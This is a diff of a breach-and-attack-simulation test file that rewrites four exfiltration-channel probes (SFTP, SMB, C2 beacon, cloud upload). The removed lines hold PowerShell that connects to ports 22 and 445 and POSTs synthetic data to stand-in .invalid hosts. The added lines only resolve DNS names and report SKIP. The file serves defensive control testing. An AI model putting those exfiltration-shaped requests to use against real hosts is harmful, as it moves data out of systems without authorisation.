@@ -2,22 +2,19 @@ id: collection-channel-variants-exfil
 product_line: dlp
 name: Exfiltration Channel Variants Probe
 description: >
-  Telemetry-safe emulation of four outbound channels that the main chain does not
-  cover: SFTP over SSH, SMB to a remote share, a C2-shaped beacon that carries
-  data, and an upload through a cloud-storage API. Each step sends a small
-  synthetic [BAS-SIM] payload to an RFC-6761 .invalid host, which cannot resolve,
-  so nothing leaves the host. Each step tests whether a different control, such as
-  the SSH, SMB or proxy egress policy, the C2 detector, or the CASB, sees the channel.
+  Resolution-only probe of four outbound channels that the main chain does not cover: SFTP over SSH,
+  SMB, a C2-shaped beacon, and a cloud-storage API upload. Each step resolves one random RFC-6761 .invalid
+  name carrying the run id. No connection is made and no data is sent. Each step then reports SKIP,
+  because a resolver result is not evidence that any egress, firewall, proxy, DLP or CASB control acted.
+  Prevention and detection are assessed only from correlated telemetry, which this release does not query.
 
-  KILL CHAIN STAGES:
-    1. SFTP Attempt       — TCP connect to SSH port 22 on a .invalid host (T1048.002)
-    2. SMB Outbound       — TCP connect to SMB port 445 on a .invalid host (T1048.003)
-    3. C2-Shaped Beacon   — POST a beacon-shaped body carrying data (T1041)
-    4. Cloud API Upload   — POST a JSON upload to a cloud-storage API shape (T1567.002)
+  KILL CHAIN STAGES (resolver probes):
+    1. SFTP / SSH         — resolve a .invalid SSH destination (T1048.002)
+    2. SMB Outbound       — resolve a .invalid SMB destination (T1048.003)
+    3. C2-Shaped Beacon   — resolve a .invalid beacon destination; no beacon body (T1041)
+    4. Cloud-Storage API  — resolve a .invalid storage destination; no upload (T1567.002)
 
-  SAFETY: Payloads are small synthetic [BAS-SIM] text. Every host is a .invalid name
-  that cannot resolve, so no connection to a real service is made. No credential is
-  used. Windows only. Telemetry mode.
+  SAFETY: no connection, no POST, no upload, no credential and no file is used. Windows only. Telemetry mode.
 author: Audspect Research
 executable: true
 local_check: false
@@ -50,7 +47,7 @@ steps:
   # ---------------------------------------------------------------------------
   # Stage 1 — SFTP over SSH (T1048.002)
   # ---------------------------------------------------------------------------
-  - name: "Channel 1 — SFTP (SSH) Connect Attempt to .invalid (T1048.002)"
+  - name: "Channel 1 — SFTP (SSH) Resolution Probe to .invalid (T1048.002)"
     technique_id: T1048.002
     framework: custom
     executor: powershell
@@ -60,35 +57,25 @@ steps:
     production_safe: true
     risk: low
     reversible: true
-    blast_radius: "Opens a TCP connection attempt to port 22 on an RFC-6761 .invalid host. The host cannot resolve, so no session is established and nothing is sent. Generates Sysmon EID 22 and EID 3."
+    blast_radius: "Resolves one random .invalid name. No connection is made and no data is sent. Generates one DNS query (Sysmon EID 22)."
     telemetry:
       - "Sysmon EID 22: DNS query for the bas-sim .invalid SFTP host"
-      - "Sysmon EID 3: outbound TCP to port 22"
     detection:
-      - "Egress: outbound SSH/SFTP to an unknown host — exfil channel alert expected"
+      - "Egress: correlated only when a real SSH event exists; none is generated here"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
-      $host22 = "bas-sim-sftp-$runId.invalid"
-      $connected = $false
-      try {
-        $c = New-Object System.Net.Sockets.TcpClient
-        $iar = $c.BeginConnect($host22, 22, $null, $null)
-        $connected = $iar.AsyncWaitHandle.WaitOne(5000) -and $c.Connected
-        $c.Close()
-      } catch { $connected = $false }
-      Write-Output "EXEC T1048.002: attempted an SSH/SFTP connection to ${host22}:22. connected=$connected (expected: false). Channel 1. [BAS-SIM-CHN-1]"
-      if ($connected) {
-        Write-Output "FAIL: An outbound SFTP connection to an unknown host was established. Egress policy is not restricting SSH to unapproved destinations."
-      } else {
-        Write-Output "FAIL: The endpoint attempted an outbound SFTP connection to an unknown host with no egress alert. Unreachable only because the domain is .invalid."
-      }
+      $name = "bas-sim-sftp-$runId.invalid"
+      $resolved = $false
+      try { $null = Resolve-DnsName -Name $name -Type A -ErrorAction Stop; $resolved = $true } catch { $resolved = $false }
+      Write-Output "EXEC T1048.002: resolver probe for $name. No connection was made and no data was sent. resolved=$resolved. Channel 1. [BAS-SIM-CHN-1]"
+      Write-Output "SKIP: No connection or transfer was made, so no egress or firewall control was exercised. A resolver result is not evidence of prevention, so no PASS or FAIL is claimed. Channel 1. [BAS-SIM-CHN-1]"
     cleanup: ""
 
   # ---------------------------------------------------------------------------
   # Stage 2 — SMB Outbound (T1048.003)
   # ---------------------------------------------------------------------------
-  - name: "Channel 2 — SMB Outbound Connect Attempt to .invalid (T1048.003)"
+  - name: "Channel 2 — SMB Outbound Resolution Probe to .invalid (T1048.003)"
     technique_id: T1048.003
     framework: custom
     executor: powershell
@@ -98,34 +85,25 @@ steps:
     production_safe: true
     risk: low
     reversible: true
-    blast_radius: "Opens a TCP connection attempt to SMB port 445 on an RFC-6761 .invalid host. No share is mounted and no data is sent. Generates Sysmon EID 22 and EID 3."
+    blast_radius: "Resolves one random .invalid name. No connection is made and no data is sent. Generates one DNS query (Sysmon EID 22)."
     telemetry:
-      - "Sysmon EID 3: outbound TCP to port 445 on an external address"
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid SMB host"
     detection:
-      - "Egress: outbound SMB to an external host — blocked by perimeter policy expected"
+      - "Egress: correlated only when a real SMB event exists; none is generated here"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
-      $smbHost = "bas-sim-smb-$runId.invalid"
-      $connected = $false
-      try {
-        $c = New-Object System.Net.Sockets.TcpClient
-        $iar = $c.BeginConnect($smbHost, 445, $null, $null)
-        $connected = $iar.AsyncWaitHandle.WaitOne(5000) -and $c.Connected
-        $c.Close()
-      } catch { $connected = $false }
-      Write-Output "EXEC T1048.003: attempted an outbound SMB connection to ${smbHost}:445. connected=$connected (expected: false). Channel 2. [BAS-SIM-CHN-2]"
-      if ($connected) {
-        Write-Output "FAIL: Outbound SMB to an external host was established. Perimeter policy is not blocking SMB egress."
-      } else {
-        Write-Output "FAIL: The endpoint attempted outbound SMB to an external host with no alert. Unreachable only because the domain is .invalid."
-      }
+      $name = "bas-sim-smb-$runId.invalid"
+      $resolved = $false
+      try { $null = Resolve-DnsName -Name $name -Type A -ErrorAction Stop; $resolved = $true } catch { $resolved = $false }
+      Write-Output "EXEC T1048.003: resolver probe for $name. No connection was made and no data was sent. resolved=$resolved. Channel 2. [BAS-SIM-CHN-2]"
+      Write-Output "SKIP: No connection or transfer was made, so no egress or firewall control was exercised. A resolver result is not evidence of prevention, so no PASS or FAIL is claimed. Channel 2. [BAS-SIM-CHN-2]"
     cleanup: ""
 
   # ---------------------------------------------------------------------------
-  # Stage 3 — C2-Shaped Beacon Carrying Data (T1041)
+  # Stage 3 — C2-Shaped Beacon Resolution Probe (T1041)
   # ---------------------------------------------------------------------------
-  - name: "Channel 3 — C2-Shaped Beacon Carrying Data (T1041)"
+  - name: "Channel 3 — C2-Shaped Beacon Resolution Probe (T1041)"
     technique_id: T1041
     framework: custom
     executor: powershell
@@ -135,34 +113,26 @@ steps:
     production_safe: true
     risk: low
     reversible: true
-    blast_radius: "Sends one HTTP POST shaped like a C2 check-in, with a synthetic [BAS-SIM] data field in the body, to an RFC-6761 .invalid host. The host cannot resolve, so nothing is delivered. Generates Sysmon EID 22 and EID 3."
+    blast_radius: "Resolves one random .invalid name. No beacon is sent and no body is posted. Generates one DNS query (Sysmon EID 22)."
     telemetry:
       - "Sysmon EID 22: DNS query for the bas-sim .invalid beacon host"
-      - "Proxy/NDR: beacon-shaped POST with a data field in the body"
+      - "Proxy/NDR: none; no beacon is sent in this probe"
     detection:
-      - "C2/NDR: periodic check-in shape carrying a data payload — exfil over C2 alert expected"
+      - "C2/NDR: correlated only when a real beacon event exists; none is generated here"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
-      $target = "http://bas-sim-beacon-$runId.invalid/api/checkin"
-      $body = '{"id":"bas-sim-' + $runId + '","status":"ok","data":"[BAS-SIM] synthetic exfil-over-c2 payload"}'
-      $reached = $false
-      try {
-        $r = Invoke-WebRequest -Uri $target -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 -UseBasicParsing
-        if ($r.StatusCode) { $reached = $true }
-      } catch { $reached = $false }
-      Write-Output "EXEC T1041: sent a C2-shaped check-in carrying a synthetic data field to $target. reached=$reached (expected: false). Channel 3. [BAS-SIM-CHN-3]"
-      if ($reached) {
-        Write-Output "FAIL: A beacon-shaped request carrying data reached an unknown host. The C2 detector is not flagging check-ins with payloads."
-      } else {
-        Write-Output "FAIL: The endpoint sent a beacon-shaped request carrying data to an unknown host with no C2 alert. Unreachable only because the domain is .invalid."
-      }
+      $name = "bas-sim-beacon-$runId.invalid"
+      $resolved = $false
+      try { $null = Resolve-DnsName -Name $name -Type A -ErrorAction Stop; $resolved = $true } catch { $resolved = $false }
+      Write-Output "EXEC T1041: resolver probe for $name. No connection was made and no data was sent. resolved=$resolved. Channel 3. [BAS-SIM-CHN-3]"
+      Write-Output "SKIP: No connection or transfer was made, so no egress or firewall control was exercised. A resolver result is not evidence of prevention, so no PASS or FAIL is claimed. Channel 3. [BAS-SIM-CHN-3]"
     cleanup: ""
 
   # ---------------------------------------------------------------------------
   # Stage 4 — Cloud-Storage API Upload (T1567.002)
   # ---------------------------------------------------------------------------
-  - name: "Channel 4 — Cloud-Storage API Upload Attempt to .invalid (T1567.002)"
+  - name: "Channel 4 — Cloud-Storage API Resolution Probe to .invalid (T1567.002)"
     technique_id: T1567.002
     framework: custom
     executor: powershell
@@ -172,26 +142,18 @@ steps:
     production_safe: true
     risk: low
     reversible: true
-    blast_radius: "Sends one JSON upload request shaped like a cloud-storage API call, with a synthetic [BAS-SIM] body and no credential, to an RFC-6761 .invalid host. The host cannot resolve, so nothing is stored. Generates Sysmon EID 22 and EID 3."
+    blast_radius: "Resolves one random .invalid name. No upload request is sent and no credential is used. Generates one DNS query (Sysmon EID 22)."
     telemetry:
       - "Sysmon EID 22: DNS query for the bas-sim .invalid API host"
-      - "CASB/SSE: upload request to an unsanctioned storage API"
+      - "CASB/SSE: none; no upload request is sent in this probe"
     detection:
-      - "CASB/SSE: API upload to an unsanctioned cloud storage service — block expected"
+      - "CASB/SSE: correlated only when a real upload event exists; none is generated here"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
-      $target = "http://bas-sim-api-$runId.invalid/v1/files/upload"
-      $body = '{"name":"bas-sim-upload.txt","parent":"root","content":"[BAS-SIM] synthetic cloud-api payload"}'
-      $reached = $false
-      try {
-        $r = Invoke-WebRequest -Uri $target -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 -UseBasicParsing
-        if ($r.StatusCode) { $reached = $true }
-      } catch { $reached = $false }
-      Write-Output "EXEC T1567.002: attempted a cloud-storage API upload to $target. reached=$reached (expected: false). Channel 4. [BAS-SIM-CHN-4]"
-      if ($reached) {
-        Write-Output "FAIL: A cloud-storage API upload to an unsanctioned service succeeded. CASB and SSE are not blocking it."
-      } else {
-        Write-Output "FAIL: The endpoint attempted a cloud-storage API upload to an unsanctioned service with no block. Unreachable only because the domain is .invalid."
-      }
+      $name = "bas-sim-cloud-$runId.invalid"
+      $resolved = $false
+      try { $null = Resolve-DnsName -Name $name -Type A -ErrorAction Stop; $resolved = $true } catch { $resolved = $false }
+      Write-Output "EXEC T1567.002: resolver probe for $name. No connection was made and no data was sent. resolved=$resolved. Channel 4. [BAS-SIM-CHN-4]"
+      Write-Output "SKIP: No connection or transfer was made, so no egress or firewall control was exercised. A resolver result is not evidence of prevention, so no PASS or FAIL is claimed. Channel 4. [BAS-SIM-CHN-4]"
     cleanup: ""
